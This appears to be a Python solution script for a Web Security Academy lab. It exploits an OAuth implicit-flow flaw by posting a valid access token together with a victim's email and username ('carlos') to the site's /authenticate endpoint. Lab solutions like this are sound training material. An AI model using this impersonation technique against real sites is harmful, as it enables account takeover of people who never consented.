import requests
import re
from bs4 import BeautifulSoup

site = '0ad700fc038ea101804f17fe00ea0062.web-security-academy.net'
oauth_site = 'oauth-0afb003b03a2a15880251565023c0038.oauth-server.net'
token = 'ElTlld36B69mFAob1eiMA3CfKkYMSIld4_rd3RD_EJL'

s = requests.Session()

# Step 1: Retrieve /me info (not used, just confirms flow)
me_url = f'https://{oauth_site}/me'
me_headers = {
    'Authorization': f'Bearer {token}',
    'Content-Type': 'application/json'
}
resp = s.get(me_url, headers=me_headers)
print(f'/me gets user information: {resp.text}')

# Step 2: POST to /authenticate with spoofed carlos info
authenticate_url = f'https://{site}/authenticate'
authenticate_data = {
    'email': 'carlos@carlos-montoya.net',
    'username': 'carlos',
    'token': token
}
authenticate_headers = {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
}

resp = s.post(authenticate_url, json=authenticate_data, headers=authenticate_headers)
print(resp.text)
